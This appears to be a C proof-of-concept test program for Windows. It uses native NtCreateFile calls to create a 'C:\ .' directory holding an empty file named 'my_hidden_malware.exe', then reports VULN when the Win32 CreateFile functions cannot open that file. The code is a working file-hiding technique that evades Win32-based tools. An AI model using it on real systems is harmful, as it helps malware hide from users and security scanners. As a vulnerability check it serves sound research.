#include <windows.h>
#include "miniddk.h"
#include <stdio.h>

typedef NTSTATUS (__stdcall *NtCreateFilePtr)(
    PHANDLE FileHandle, 
    ACCESS_MASK DesiredAccess, 
    OBJECT_ATTRIBUTES *ObjectAttributes, 
    PIO_STATUS_BLOCK IoStatusBlock, 
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes, 
    ULONG ShareAccess, 
    ULONG CreateDisposition, 
    ULONG CreateOptions, 
    PVOID EaBuffer, 
    ULONG EaLength );

typedef VOID (__stdcall *RtlInitUnicodeStringPtr) (
    IN OUT PUNICODE_STRING  DestinationString,
    IN PCWSTR  SourceString );

int main(int argc, char *argv[]) 
{
    UNICODE_STRING fn;
    OBJECT_ATTRIBUTES object;
    IO_STATUS_BLOCK ioStatus;
    NtCreateFilePtr pNtCreateFile;
    RtlInitUnicodeStringPtr pRtlInitUnicodeString;
    HANDLE out;
    NTSTATUS status;
    HMODULE hMod;

    hMod = LoadLibraryA("ntdll.dll");
    if (!hMod) {
		printf("SKIP: Could not load ntdll.dll\n");
		exit(0);
    }
    pNtCreateFile = (NtCreateFilePtr) GetProcAddress(hMod, "NtCreateFile");
    if (!pNtCreateFile) {
		printf("FAIL: Could not locate NtCreateFile\n");
		exit(1);
    }
    pRtlInitUnicodeString = (RtlInitUnicodeStringPtr) GetProcAddress(hMod,
						"RtlInitUnicodeString");

    memset(&ioStatus, 0, sizeof(ioStatus));
    memset(&object, 0, sizeof(object));
    object.Length = sizeof(object);
    object.Attributes = OBJ_CASE_INSENSITIVE;
    pRtlInitUnicodeString(&fn, L"\\??\\C:\\ .");
    object.ObjectName = &fn;
    status = pNtCreateFile(&out, GENERIC_WRITE, &object, &ioStatus, NULL,
		      FILE_ATTRIBUTE_NORMAL, 0, FILE_CREATE, FILE_DIRECTORY_FILE, NULL,
		      0);
    if (!NT_SUCCESS(status)) {
		printf("FAIL: Could not create directory 'C:\\ .'.\n");
		exit(1);
    }
    printf("PASS: Successfully created 'C:\\ .' directory!\n");
    
	pRtlInitUnicodeString(&fn, L"\\??\\C:\\ .\\my_hidden_malware.exe");
    status = pNtCreateFile(&out, GENERIC_WRITE, &object, &ioStatus, NULL,
		      FILE_ATTRIBUTE_NORMAL, 0, FILE_CREATE, FILE_NON_DIRECTORY_FILE, NULL,
		      0);
    if (!NT_SUCCESS(status)) {
		printf("FAIL: Could not create file 'C:\\ .\\my_hidden_malware.exe'.\n");
		exit(1);
    }
    printf("PASS: Successfully created 'C:\\ .\\my_hidden_malware.exe' file!\n");
    

    status = pNtCreateFile(&out, FILE_READ_ATTRIBUTES | FILE_READ_EA | READ_CONTROL, &object, &ioStatus, NULL,
		      FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL,
		      0);
    if (!NT_SUCCESS(status)) {
		printf("FAIL: 'C:\\ .\\my_hidden_malware.exe' file could not be accessed.\n");
		exit(1);
    }
    printf("PASS: 'C:\\ .\\my_hidden_malware.exe' file can be accessed via NtCreateFile!\n");
    
    HANDLE hFile = CreateFileW(L"C:\\ .\\my_hidden_malware.exe", // open testfile.txt
                        GENERIC_READ, // open for reading
						0, // do not share
						NULL, // default security
						OPEN_EXISTING, // existing file only
						FILE_ATTRIBUTE_NORMAL, // normal file
						NULL);
	if(hFile==-1){
		printf("VULN: Unable to read 'C:\\ .\\my_hidden_malware.exe' file via CreateFileW.\n");
    }
    hFile = CreateFileA("C:\\ .\\my_hidden_malware.exe", // open testfile.txt
                        GENERIC_READ, // open for reading
						0, // do not share
						NULL, // default security
						OPEN_EXISTING, // existing file only
						FILE_ATTRIBUTE_NORMAL, // normal file
						NULL);
	if(hFile==-1){
		printf("VULN: Unable to read 'C:\\ .\\my_hidden_malware.exe' file via CreateFileA.\n");
    }
    return 0;
}
